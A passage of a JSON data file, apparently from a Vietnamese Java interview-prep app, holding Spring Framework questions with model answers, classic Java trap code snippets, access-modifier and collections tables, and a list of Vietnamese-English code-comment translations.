      "seniorTip": "Nêu rõ: Không nên viết logic kết nối DB/gọi API trong Constructor mà nên viết trong @PostConstruct vì lúc ở Constructor các biến @Autowired chưa được tiêm xong!"
    },
    {
      "id": "audit_44",
      "domain": "Spring Framework",
      "question": "Phân biệt các Scope của Spring Bean: Singleton, Prototype, Request, Session? Mặc định là scope nào?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Mặc định là SINGLETON Scope.",
        "Singleton: Chỉ tạo DUY NHẤT 1 instance cho toàn bộ Spring Container. Mọi nơi inject đều dùng chung 1 object đó.",
        "Prototype: Mỗi lần inject hoặc gọi getBean() là tạo ra một INSTANCE MỚI HOÀN TOÀN.",
        "Request Scope: Tạo instance mới cho mỗi HTTP Request trong ứng dụng Web.",
        "Session Scope: Tạo instance mới cho mỗi HTTP Session của người dùng.",
        "Cảnh báo: Singleton Bean phải là STATELESS (không lưu trữ trạng thái riêng) để đảm bảo an toàn đa luồng."
      ],
      "modelAnswer": "Spring hỗ trợ nhiều Scope định nghĩa phạm vi tồn tại của Bean thông qua chú thích `@Scope`:\n1. **`singleton` (MẶC ĐỊNH TRONG SPRING)**:\n   - Spring IoC Container chỉ tạo **duy nhất 1 instance** của Bean đó trong suốt vòng đời của ứng dụng.\n   - Tất cả các class khác khi tiêm Bean này đều dùng chung một đối tượng duy nhất trên bộ nhớ Heap.\n   - **Quy tắc vàng**: Singleton Bean **bắt buộc phải là Stateless (không có trạng thái riêng)**, các trường chỉ chứa các Service/Repository khác chứ không được chứa dữ liệu riêng của người dùng để tránh lỗi xung đột đa luồng.\n2. **`prototype`**:\n   - Ngược lại với Singleton. **Mỗi lần** có một class yêu cầu tiêm Bean này (hoặc mỗi lần gọi `context.getBean()`), Spring sẽ tạo ra một **đối tượng hoàn toàn mới độc lập**.\n   - Thích hợp cho các đối tượng có lưu trữ trạng thái biến thiên (**Stateful Bean**).\n3. **Các Web-aware Scopes** (chỉ có trong ứng dụng Spring Web/Spring MVC):\n   - **`request`**: Mỗi một HTTP Request gửi đến sẽ được tạo một instance Bean riêng, hết request thì Bean bị hủy.\n   - **`session`**: Một instance Bean được tạo cho một phiên làm việc HTTP Session của người dùng.\n   - **`application`**: Gắn với vòng đời của `ServletContext`.",
      "seniorTip": "Một câu hỏi bẫy rất hay gặp: 'Điều gì xảy ra khi ta tiêm một Prototype Bean vào bên trong một Singleton Bean?' (Trả lời: Prototype Bean sẽ chỉ được khởi tạo 1 lần duy nhất cùng với Singleton, muốn lấy mới phải dùng ObjectProvider hoặc @Lookup)."
    },
    {
      "id": "audit_45",
      "domain": "Spring Framework",
      "question": "Phân biệt các Stereotype Annotations trong Spring: @Component, @Service, @Repository và @Controller?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "@Component: Chú thích gốc (Generic stereotype) cho bất kỳ class Java nào muốn được Spring quản lý.",
        "@Service: Chuyên biệt cho tầng nghiệp vụ (Business Logic/Service Layer), cải thiện tính tường minh.",
        "@Repository: Chuyên biệt cho tầng truy cập dữ liệu (Data Access/DAO), tự động chuyển đổi các lỗi SQLException thành Spring DataAccessException (Exception Translation).",
        "@Controller / @RestController: Chuyên biệt cho tầng điều khiển giao diện web / API RESTful."
      ],
      "modelAnswer": "Tất cả các chú thích này đều là **Stereotype Annotations** và về mặt kỹ thuật, `@Service`, `@Repository`, `@Controller` đều là các **Meta-annotation kế thừa từ `@Component`** (đều được Spring Component Scanning phát hiện và đăng ký vào IoC Container). Tuy nhiên chúng được phân định để phục vụ kiến trúc phân tầng:\n1. **`@Component`**:\n   - Là chú thích tổng quát nhất. Dùng để đánh dấu bất kỳ một class tiện ích, module nền tảng nào thuộc quyền quản lý của Spring mà không thuộc 3 tầng còn lại.\n2. **`@Service`**:\n   - Dành riêng cho **Tầng Nghiệp Vụ (Business Logic Layer)**.\n   - Mang ý nghĩa ngữ nghĩa rõ ràng, giúp lập trình viên và các công cụ giám sát biết rằng đây là nơi xử lý các quy tắc nghiệp vụ, tính toán logic và giao dịch.\n3. **`@Repository`**:\n   - Dành riêng cho **Tầng Truy Xuất Dữ Liệu (Data Access Layer / DAO)**.\n   - **Tính năng đặc biệt**: Tự động kích hoạt cơ chế **Dịch ngoại lệ (Exception Translation)**. Nó tự động bắt các ngoại lệ cấp thấp của JDBC/Hibernate (như `SQLException`) và bọc lại thành các ngoại lệ phân cấp nhất quán của Spring (`DataAccessException`), giúp code không bị phụ thuộc vào DB cụ thể.\n4. **`@Controller` / `@RestController`**:\n   - Dành cho **Tầng Điều Khiển (Presentation / API Layer)**.\n   - Xử lý các HTTP Request gửi đến và trả về View HTML hoặc trả về dữ liệu JSON (`@ResponseBody`).",
      "seniorTip": "Điểm đắt giá nhất câu trả lời là tính năng Exception Translation tự động của @Repository."
    },
    {
      "id": "audit_46",
      "domain": "Spring Framework",
      "question": "Khi một Interface có 2 class cùng implement, làm thế nào để Spring biết cần inject Bean nào khi dùng @Autowired? Phân biệt @Qualifier và @Primary?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Khi có 2 Bean cùng kiểu (type candidate), @Autowired sẽ văng ngoại lệ NoUniqueBeanDefinitionException.",
        "Giải pháp 1: Dùng @Primary trên class ưu tiên mặc định.",
        "Giải pháp 2: Dùng @Qualifier('beanName') tại vị trí inject để chỉ định đích danh tên Bean muốn tiêm.",
        "@Qualifier có độ ưu tiên cao hơn @Primary."
      ],
      "modelAnswer": "1. **Vấn đề phát sinh**:\n   - Giả sử có `interface PaymentService` và có 2 class triển khai là `VnPayPaymentService` và `MomoPaymentService`. Cả hai đều được đánh dấu `@Service`.\n   - Khi một class khác khai báo: `@Autowired private PaymentService paymentService;`, Spring sẽ bối rối vì tìm thấy 2 ứng viên cùng kiểu và lập tức văng lỗi lúc khởi động: **`NoUniqueBeanDefinitionException`**.\n2. **Cách giải quyết với `@Primary` và `@Qualifier`**:\n   - **Sử dụng `@Primary`**:\n     - Đặt chú thích `@Primary` trên 1 trong 2 class (ví dụ trên `VnPayPaymentService`).\n     - Ý nghĩa: Đây là **lựa chọn mặc định ưu tiên số 1**. Bất cứ nơi nào yêu cầu tiêm `PaymentService` mà không chỉ định rõ thì Spring sẽ tự động chọn `VnPayPaymentService`.\n   - **Sử dụng `@Qualifier(\"beanName\")`**:\n     - Đặt trực tiếp tại vị trí tiêm phụ thuộc: `@Autowired @Qualifier(\"momoPaymentService\") private PaymentService paymentService;`\n     - Ý nghĩa: Chỉ định **chính xác tên định danh của Bean** cần lấy.\n3. **Độ ưu tiên**: `@Qualifier` **luôn có độ ưu tiên cao hơn** `@Primary`. Nếu có cả hai, Spring sẽ lấy Bean được chỉ định bởi `@Qualifier`.",
      "seniorTip": "Nếu tên biến trùng với tên Bean (ví dụ private PaymentService momoPaymentService), Spring cũng tự động fallback lấy theo tên biến."
    },
    {
      "id": "audit_47",
      "domain": "Spring Framework",
      "question": "Trình bày luồng xử lý một HTTP Request trong kiến trúc Spring MVC? Vai trò của DispatcherServlet?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "DispatcherServlet là Front Controller tiếp nhận mọi request đầu tiên.",
        "Luồng 5 bước: DispatcherServlet -> HandlerMapping (tìm Controller) -> HandlerAdapter (thực thi Controller) -> Controller xử lý trả về ModelAndView -> ViewResolver (tìm file giao diện) -> Render HTML trả về client.",
        "Với REST API (@RestController): HandlerAdapter dùng HttpMessageConverter (Jackson) chuyển thẳng đối tượng sang JSON trả về body."
      ],
      "modelAnswer": "Kiến trúc Spring MVC hoạt động dựa trên mẫu thiết kế **Front Controller**, trong đó **`DispatcherServlet`** đóng vai trò là bộ não điều phối trung tâm:\n1. **Bước 1**: Trình duyệt gửi HTTP Request đến máy chủ. `DispatcherServlet` là cửa ngõ duy nhất chặn và tiếp nhận request này đầu tiên.\n2. **Bước 2**: `DispatcherServlet` hỏi **`HandlerMapping`** để tìm xem Controller và phương thức cụ thể nào chịu trách nhiệm xử lý URL này (dựa trên `@GetMapping`, `@PostMapping`).\n3. **Bước 3**: Sau khi xác định được Controller, `DispatcherServlet` ủy quyền cho **`HandlerAdapter`** để thực thi phương thức trong Controller đó. Controller gọi xuống tầng Service/DAO xử lý logic nghiệp vụ và trả về kết quả (dữ liệu Model và tên View).\n4. **Bước 4**: `DispatcherServlet` chuyển tên View cho **`ViewResolver`** (như `InternalResourceViewResolver`). `ViewResolver` sẽ tìm đường dẫn file vật lý (ví dụ `/WEB-INF/views/home.jsp`).\n5. **Bước 5**: View nhận dữ liệu Model để render thành mã HTML hoàn chỉnh và trả về cho trình duyệt.\n*(Lưu ý: Đối với REST API dùng `@RestController`, luồng sẽ bỏ qua ViewResolver; Spring dùng `HttpMessageConverter` (như thư viện Jackson) để tự động serialize đối tượng Java thành chuỗi JSON và ghi thẳng vào HTTP Response Body)*.",
      "seniorTip": "Vẽ nhanh luồng gồm DispatcherServlet ở trung tâm kết nối với HandlerMapping, Controller, ViewResolver để chứng minh kiến thức chuyên sâu."
    },
    {
      "id": "audit_48",
      "domain": "Spring Framework",
      "question": "Từ khóa @Transactional trong Spring hoạt động như thế nào? Nêu 3 trường hợp phổ biến khiến @Transactional không có tác dụng?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Cơ chế: Dựa trên Spring AOP (Aspect Oriented Programming) tạo Dynamic Proxy bọc lấy Bean.",
        "Proxy mở transaction trước khi vào hàm, gọi commit khi hàm kết thúc thành công, hoặc rollback khi ném RuntimeException.",
        "Trường hợp 1 không chạy: Self-invocation (hàm cùng class gọi nhau thì gọi trực tiếp 'this', không đi qua Proxy).",
        "Trường hợp 2: Đặt @Transactional trên method private/protected (Proxy không can thiệp được).",
        "Trường hợp 3: Mặc định Spring chỉ rollback với Unchecked Exception (RuntimeException). Nếu ném Checked Exception mà không khai báo rollbackFor = Exception.class thì transaction KHÔNG rollback!"
      ],
      "modelAnswer": "1. **Cơ chế hoạt động của `@Transactional`**:\n   - Spring sử dụng kỹ thuật **AOP (Aspect-Oriented Programming)** để sinh ra một lớp bao bọc ảo (**Proxy Object**) bao quanh Bean thực tế.\n   - Khi một method có `@Transactional` được gọi từ bên ngoài, luồng sẽ đi qua Proxy trước. Proxy sẽ:\n     - Mở một Transaction mới kết nối với Database (`setAutoCommit(false)`).\n     - Chuyển tiếp lời gọi tới method thật để thực thi các câu lệnh SQL.\n     - Nếu method chạy thành công: Proxy gọi `connection.commit()`.\n     - Nếu method ném ra ngoại lệ: Proxy bắt lấy và gọi `connection.rollback()`.\n2. **3 Trường hợp kinh điển khiến `@Transactional` BỊ VÔ HIỆU HÓA (Rất hay gặp trong dự án)**:\n   - **Trường hợp 1: Tự gọi nội bộ (Self-invocation)**: Khi Method A gọi sang Method B trong **cùng một class**, lời gọi thực chất là `this.methodB()`. Lời gọi này không đi qua Spring Proxy, do đó các cấu hình `@Transactional` trên Method B hoàn toàn bị bỏ qua!\n   - **Trường hợp 2: Đặt trên phương thức `private` hoặc `protected`**: Spring AOP Proxy chỉ có thể override các phương thức `public`. Đặt trên hàm private sẽ bị Spring lờ đi và không có transaction nào được tạo.\n   - **Trường hợp 3: Ném Checked Exception mà không cấu hình `rollbackFor`**: Mặc định Spring **CHỈ ROLLBACK VỚI RUNTIME EXCEPTION**. Nếu code ném ra một Checked Exception (như `SQLException`, `IOException`), Spring sẽ **vẫn COMMIT bình thường**! Muốn an toàn bắt buộc phải khai báo: `@Transactional(rollbackFor = Exception.class)`.",
      "seniorTip": "Cả 3 trường hợp này đều là các bug bảo mật/toàn vẹn dữ liệu cực kỳ nguy hiểm trong dự án thực tế."
    },
    {
      "id": "audit_49",
      "domain": "Spring Framework",
      "question": "Vấn đề N+1 Query trong JPA/Hibernate là gì? Nguyên nhân và cách khắc phục tối ưu trong dự án thực tế?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "N+1 Query xảy ra khi truy vấn 1 danh sách gồm N đối tượng cha, nhưng Hibernate lại phát sinh thêm N câu lệnh SQL phụ để truy vấn các đối tượng con liên quan.",
        "Tổng cộng có 1 + N câu query gửi tới DB, làm suy sụp hiệu năng database nghiêm trọng.",
        "Nguyên nhân: Mặc định quan hệ Lazy Loading hoặc Eager Loading không dùng JOIN khi duyệt danh sách.",
        "Giải pháp: (1) Dùng JOIN FETCH trong câu lệnh HQL/JPQL; (2) Dùng @EntityGraph; (3) Cấu hình batch size (@BatchSize)."
      ],
      "modelAnswer": "1. **Bản chất của vấn đề N+1 Query**:\n   - Giả sử ta có quan hệ 1-N giữa `Department` (Phòng ban) và `Employee` (Nhân viên).\n   - Ta muốn lấy danh sách 100 phòng ban kèm nhân viên. Hibernate chạy 1 câu query đầu tiên: `SELECT * FROM department;` (lấy ra 100 dòng).\n   - Sau đó, khi code duyệt qua từng phòng ban để lấy danh sách nhân viên (`dept.getEmployees()`), Hibernate lại âm thầm phát sinh thêm 100 câu query con: `SELECT * FROM employee WHERE dept_id = ?;` cho từng phòng ban một!\n   - Kết quả: Thay vì chỉ cần 1 câu lệnh kết nối, hệ thống đã gửi tới **1 + 100 = 101 câu query** xuống Database, gây nghẽn băng thông mạng và làm đơ server.\n2. **Các giải pháp khắc phục triệt để**:\n   - **Sử dụng `JOIN FETCH` trong JPQL**: Thay vì `SELECT d FROM Department d`, ta viết: **`SELECT d FROM Department d JOIN FETCH d.employees`**. Câu lệnh này chỉ thị Hibernate sinh ra 1 câu lệnh SQL duy nhất dùng `INNER JOIN` hoặc `LEFT JOIN` để gom cả cha và con về cùng một lúc.\n   - **Sử dụng `@EntityGraph` (Spring Data JPA)**: Khai báo `@EntityGraph(attributePaths = {\"employees\"})` ngay trên method của Repository.\n   - **Cấu hình `@BatchSize(size = 20)`**: Thay vì truy vấn từng dòng một, Hibernate sẽ gom thành câu lệnh `WHERE dept_id IN (?, ?, ...)` để giảm từ N câu xuống còn N/20 câu.",
      "seniorTip": "Nêu 'JOIN FETCH' là giải pháp kinh điển và hiệu quả nhất mà mọi Senior Backend Java đều dùng hàng ngày."
    },
    {
      "id": "audit_50",
      "domain": "Spring Framework",
      "question": "Spring Boot tự động cấu hình (Auto-configuration) hoạt động dựa trên cơ chế nào? Chú thích @SpringBootApplication bao gồm những gì?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "@SpringBootApplication là tổ hợp của 3 chú thích: @Configuration, @EnableAutoConfiguration, @ComponentScan.",
        "Cơ chế Auto-configuration: Quét các thư viện có trong classpath (file JAR dependency). Dựa vào các điều kiện @ConditionalOnClass, @ConditionalOnMissingBean để tự động cấu hình các Bean thích hợp.",
        "Ví dụ: Thấy spring-boot-starter-web có trong classpath -> tự động cấu hình Tomcat nhúng và DispatcherServlet mà không cần viết file web.xml."
      ],
      "modelAnswer": "1. **Tổ hợp bên trong `@SpringBootApplication`**:\n   - Đây là một Meta-annotation đóng gói 3 chú thích cốt lõi:\n     1. **`@Configuration`**: Cho phép class khai báo các Bean cấu hình bằng `@Bean`.\n     2. **`@ComponentScan`**: Tự động quét toàn bộ các package con bên dưới để tìm và đăng ký các Bean có gắn `@Component`, `@Service`, `@Repository`, `@Controller`.\n     3. **`@EnableAutoConfiguration`**: Kích hoạt cơ chế tự động cấu hình ma thuật của Spring Boot.\n2. **Cơ chế hoạt động của Auto-configuration**:\n   - Spring Boot giải phóng lập trình viên khỏi việc phải viết hàng trăm dòng cấu hình XML phức tạp trong quá khứ.\n   - Khi khởi động, Spring Boot duyệt qua file cấu hình `META-INF/spring.factories` (hoặc `AutoConfiguration.imports` từ Spring Boot 3).\n   - Nó sử dụng hàng loạt các chú thích điều kiện thuộc họ **`@Conditional`**:\n     - **`@ConditionalOnClass`**: \"Nếu phát hiện trong classpath có class `HikariDataSource.class` thì tự động khởi tạo Connection Pool HikariCP\".\n     - **`@ConditionalOnMissingBean`**: \"Chỉ tự động tạo Bean này nếu lập trình viên CHƯA TỰ VIẾT một Bean tùy biến nào khác\".\n   - Nhờ đó, chỉ cần ta thêm dependency `starter-web`, Spring Boot sẽ tự động dựng sẵn Tomcat nhúng, cấu hình DispatcherServlet và Jackson JSON parser trong chớp mắt mà không cần ta phải can thiệp thủ công.",
      "seniorTip": "Nhắc tới file 'spring.factories' hoặc 'AutoConfiguration.imports' chứng minh bạn đã từng đào sâu vào mã nguồn framework."
    }
  ],
  "traps": {
    "classicTraps": [
      {
        "id": "trap_1",
        "title": "Bẫy 1: Local Variable không có giá trị mặc định",
        "category": "Syntax & Compilation",
        "description": "Biến cục bộ (local variable) khai báo trong phương thức không được JVM gán giá trị mặc định. Nếu sử dụng biến khi chưa khởi tạo, chương trình sẽ gặp Compile Error ngay lập tức.",
        "badCode": "public void test() {\n    int x;\n    System.out.println(x); // COMPILE ERROR!\n}",
        "goodCode": "public void test() {\n    int x = 0; // Khởi tạo rõ ràng\n    System.out.println(x); // OK: 0\n}",
        "rule": "Chỉ có instance variables và static variables mới có default values (0, false, null)."
      },
      {
        "id": "trap_2",
        "title": "Bẫy 2: Phép cộng kiểu byte tự động bị nâng lên int",
        "category": "Operators & Casting",
        "description": "Các phép toán số học (+, -, *, /) trên các kiểu số nguyên nhỏ hơn int (byte, short, char) luôn trả về kiểu int.",
        "badCode": "byte a = 10, b = 20;\n// byte c = a + b; // COMPILE ERROR: cannot convert from int to byte",
        "goodCode": "byte a = 10, b = 20;\nbyte c = (byte)(a + b); // Ép kiểu tường minh\n// Hoặc: a += b; (Toán tử kết hợp tự động ép kiểu)",
        "rule": "Biểu thức `a + b` có kiểu int. Muốn gán lại cho byte phải ép kiểu `(byte)(a + b)`."
      },
      {
        "id": "trap_3",
        "title": "Bẫy 3: Postfix x = x++ không làm tăng giá trị của x",
        "category": "Operators",
        "description": "Toán tử postfix `x++` trả về giá trị cũ trước khi tăng, sau đó phép gán `=` lại đè giá trị cũ này lên x.",
        "badCode": "int x = 5;\nx = x++;\nSystem.out.println(x); // Kết quả vẫn là 5!",
        "goodCode": "int x = 5;\nx++; // Hoặc: x = ++x;\nSystem.out.println(x); // In ra 6",
        "rule": "Không bao giờ gán kết quả của phép toán postfix tăng/giảm lại chính biến đó."
      },
      {
        "id": "trap_4",
        "title": "Bẫy 4: Lệnh return trong finally nuốt chửng kết quả của try",
        "category": "Flow Control & Exceptions",
        "description": "Khối finally luôn luôn chạy trước khi phương thức kết thúc. Nếu trong finally có lệnh return, nó sẽ ghi đè lên giá trị return hoặc exception ném ra ở try/catch.",
        "badCode": "public int getNumber() {\n    try {\n        return 10;\n    } finally {\n        return 20;\n    }\n} // Luôn trả về 20!",
        "goodCode": "// Tránh viết lệnh return hoặc throw trong khối finally",
        "rule": "Finally chỉ nên dùng để đóng kết nối tài nguyên (close file, database connection), không viết return."
      },
      {
        "id": "trap_5",
        "title": "Bẫy 5: Thuộc tính (fields) không có tính đa hình",
        "category": "Object Orientation",
        "description": "Tính đa hình (Polymorphism) chỉ áp dụng cho instance method. Truy cập thuộc tính hoàn toàn phụ thuộc vào kiểu tham chiếu lúc compile.",
        "badCode": "class Parent { int x = 10; }\nclass Child extends Parent { int x = 20; }\n\nParent p = new Child();\nSystem.out.println(p.x); // In ra 10! (Lấy thuộc tính của Parent)",
        "goodCode": "// Muốn đa hình thuộc tính, hãy dùng getter method:\nclass Parent { int getX() { return 10; } }\nclass Child extends Parent { int getX() { return 20; } }\n\nParent p = new Child();\nSystem.out.println(p.getX()); // In ra 20 (Đa hình)",
        "rule": "Biến nào được gọi phụ thuộc vào Reference Type, phương thức nào được gọi phụ thuộc vào Runtime Object Type."
      },
      {
        "id": "trap_6",
        "title": "Bẫy 6: Integer Cache autoboxing -128 đến 127",
        "category": "String & Wrappers",
        "description": "Java cache các đối tượng Integer từ -128 đến 127. Ngoài khoảng này, phép so sánh `==` sẽ trả về false dù cùng giá trị.",
        "badCode": "Integer a = 150, b = 150;\nSystem.out.println(a == b); // In ra false!",
        "goodCode": "Integer a = 150, b = 150;\nSystem.out.println(a.equals(b)); // In ra true",
        "rule": "Luôn luôn dùng phương thức `.equals()` khi so sánh các đối tượng Wrapper."
      },
      {
        "id": "trap_7",
        "title": "Bẫy 7: Interface variables luôn là public static final",
        "category": "Declarations",
        "description": "Biến trong interface mặc định là hằng số `public static final`. Không thể khai báo private hoặc gán lại giá trị.",
        "badCode": "interface Config {\n    // private int TIMEOUT = 5000; // COMPILE ERROR!\n    int TIMEOUT = 5000;\n}\nclass App {\n    void test() {\n        // Config.TIMEOUT = 10000; // COMPILE ERROR: cannot assign a value to final variable\n    }\n}",
        "goodCode": "interface Config {\n    int TIMEOUT = 5000; // public static final ngầm định\n}",
        "rule": "Biến trong interface luôn là hằng số."
      },
      {
        "id": "trap_8",
        "title": "Bẫy 8: Quên default constructor của class cha",
        "category": "Constructors",
        "description": "Nếu class cha chỉ có constructor có tham số, class con không thể kế thừa nếu không gọi tường minh `super(params)` ở dòng đầu tiên.",
        "badCode": "class Parent {\n    Parent(String name) {}\n}\n// class Child extends Parent {} // COMPILE ERROR: Implicit super constructor Parent() is undefined",
        "goodCode": "class Child extends Parent {\n    Child() {\n        super(\"Default\"); // Gọi tường minh constructor của cha\n    }\n}",
        "rule": "Constructor ngầm định của class con luôn gọi `super()`. Nếu cha không có constructor không tham số thì phải tự viết constructor con và gọi `super(...)`."
      }
    ],
    "accessModifiersMatrix": [
      {
        "modifier": "public",
        "sameClass": "Có",
        "samePackage": "Có",
        "subclassDifferentPackage": "Có",
        "world": "Có"
      },
      {
        "modifier": "protected",
        "sameClass": "Có",
        "samePackage": "Có",
        "subclassDifferentPackage": "Có (chỉ qua kế thừa)",
        "world": "Không"
      },
      {
        "modifier": "default (không ghi)",
        "sameClass": "Có",
        "samePackage": "Có",
        "subclassDifferentPackage": "Không",
        "world": "Không"
      },
      {
        "modifier": "private",
        "sameClass": "Có",
        "samePackage": "Không",
        "subclassDifferentPackage": "Không",
        "world": "Không"
      }
    ],
    "collectionsMatrix": [
      {
        "name": "ArrayList",
        "type": "List",
        "duplicates": "Có",
        "ordered": "Có (theo index)",
        "sorted": "Không",
        "threadSafe": "Không",
        "notes": "Truy xuất ngẫu nhiên O(1), thêm/xóa ở giữa O(N)"
      },
      {
        "name": "LinkedList",
        "type": "List/Deque",
        "duplicates": "Có",
        "ordered": "Có (theo index)",
        "sorted": "Không",
        "threadSafe": "Không",
        "notes": "Thêm/xóa O(1) nếu đã có con trỏ, truy xuất O(N)"
      },
      {
        "name": "Vector",
        "type": "List",
        "duplicates": "Có",
        "ordered": "Có",
        "sorted": "Không",
        "threadSafe": "CÓ (synchronized)",
        "notes": "Legacy collection, hiệu năng thấp hơn ArrayList"
      },
      {
        "name": "HashSet",
        "type": "Set",
        "duplicates": "KHÔNG",
        "ordered": "KHÔNG",
        "sorted": "Không",
        "threadSafe": "Không",
        "notes": "Dựa trên HashMap, O(1) cho add/contains/remove"
      },
      {
        "name": "LinkedHashSet",
        "type": "Set",
        "duplicates": "KHÔNG",
        "ordered": "CÓ (theo thứ tự chèn)",
        "sorted": "Không",
        "threadSafe": "Không",
        "notes": "Duy trì doubly-linked list nối qua các phần tử"
      },
      {
        "name": "TreeSet",
        "type": "Set",
        "duplicates": "KHÔNG",
        "ordered": "CÓ (theo thứ tự sắp xếp)",
        "sorted": "CÓ (Comparable/Comparator)",
        "threadSafe": "Không",
        "notes": "Dựa trên Red-Black Tree, O(log N)"
      },
      {
        "name": "HashMap",
        "type": "Map",
        "duplicates": "Key: Không / Val: Có",
        "ordered": "KHÔNG",
        "sorted": "Không",
        "threadSafe": "Không",
        "notes": "Cho phép 1 key null và nhiều value null"
      },
      {
        "name": "Hashtable",
        "type": "Map",
        "duplicates": "Key: Không / Val: Có",
        "ordered": "KHÔNG",
        "sorted": "Không",
        "threadSafe": "CÓ (synchronized)",
        "notes": "KHÔNG cho phép bất kỳ key hay value null nào"
      },
      {
        "name": "TreeMap",
        "type": "Map",
        "duplicates": "Key: Không / Val: Có",
        "ordered": "CÓ (Key sắp xếp)",
        "sorted": "CÓ (Key Comparable)",
        "threadSafe": "Không",
        "notes": "O(log N) cho các thao tác"
      }
    ]
  },
  "commentCodes": [
    {
      "id": 1,
      "vi": "Lấy danh sách các trận đấu",
      "en": "Get list of matches"
    },
    {
      "id": 2,
      "vi": "Thực hiện xóa các trận đấu",
      "en": "Delete matches"
    },
    {
      "id": 3,
      "vi": "Tìm kiếm các trận đấu theo ngày giờ",
      "en": "Search matches by time"
    },
    {
      "id": 4,
      "vi": "Thực hiện thêm các trận đấu",
      "en": "Add matches"
    },
    {
      "id": 5,
      "vi": "(Kiểm tra [var] có tồn tại hay không )",
      "en": "Check if [var] exists"
    },
    {
      "id": 6,
      "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
      "en": "Return \"True\" if [var] exists or false if [var] does not exist"
    },
    {
      "id": 7,
      "vi": "(Lấy số ngày nghỉ của một tháng)",
      "en": "Get number of days off of a month"
    },
    {
      "id": 8,
      "vi": "(Lấy các tháng của năm)",
      "en": "Get months of year"
    },
    {
      "id": 9,
      "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
      "en": "Get all days off of months and years from database"
    },
    {
      "id": 10,
      "vi": "Xóa tất cả ngày nghỉ của một tháng",
      "en": "Delete all days off of a month"
    },
    {
      "id": 11,
      "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
      "en": "Return \"true\" on success or \"false\" on failure"
    },
    {
      "id": 12,
      "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
      "en": "Register or update days off of a month"
    },
    {
      "id": 13,
      "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
      "en": "Get list of days off of a month"
    },
    {
      "id": 14,
      "vi": "(Duyệt qua các ngày của tháng)",
      "en": "Iterate days of the month"
    },
    {
      "id": 15,
      "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
      "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
    },
    {
      "id": 16,
      "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
      "en": "if day of month has data containing \"*\", increase countDayOff by 1"
    },
    {
      "id": 17,
      "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
      "en": "Export data of all months of current year on screen"
    },
    {
      "id": 18,
      "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
      "en": "Export all data of days off in database"
    },
    {
      "id": 19,
      "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
      "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
    },
    {
      "id": 20,
      "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
      "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
    },
    {
      "id": 21,
      "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
      "en": "check existion of data from database"
    },
    {
      "id": 22,
      "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
      "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
    },
    {
      "id": 23,
      "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
      "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
    },
    {
      "id": 24,
      "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
      "en": "Get list from table ABC by inputted conditions"
    },
    {
      "id": 25,
      "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
      "en": "Function of updating and deleting record in database"
    },
    {
      "id": 26,
      "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
      "en": "Do not input space at the beginning of string"
    },
    {
      "id": 27,
      "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
      "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
    },
    {
      "id": 28,
      "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
      "en": "Please input hour format without greater than 24"
    },
    {
      "id": 29,
      "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
      "en": "If fields of city and name are not null, search by 2 above conditions"
    },
    {
      "id": 30,
      "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
      "en": "If fields of city, year and name are null, show all lists from Trainer table"
    },
    {
      "id": 31,
      "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
      "en": "Check if clicking button DELETE, show on NOTICE"
    },
    {
      "id": 32,
      "vi": "Set giá trị cho biến bị lỗi ở class không tìm thấy",
      "en": "Set values for undefined variables at invisible CLASS"
    },
    {
      "id": 33,
      "vi": "Định nghĩa form từ action",
      "en": "Define Form from ACTION"
    },
    {
      "id": 34,
      "vi": "Đặt giá trị cho biến",
      "en": "Assign values to variables"
    },
    {
      "id": 35,
      "vi": "Khởi tạo đối tượng connection",
      "en": "Initialize connection object"
    },
    {
      "id": 36,
      "vi": "Câu truy vấn sql không thực hiện được",
      "en": "SQL  statement can not be executed"
    },
    {
      "id": 37,
      "vi": "Lấy danh sách theo điều kiện gán",
      "en": "Get list by assigning condition"
    },
    {
      "id": 38,
      "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
      "en": "Assign values to variabes from list in database"
    },
    {
      "id": 39,
      "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
      "en": "Check if taken data is null, export all list, else, export by data"
    },
    {
      "id": 40,
      "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
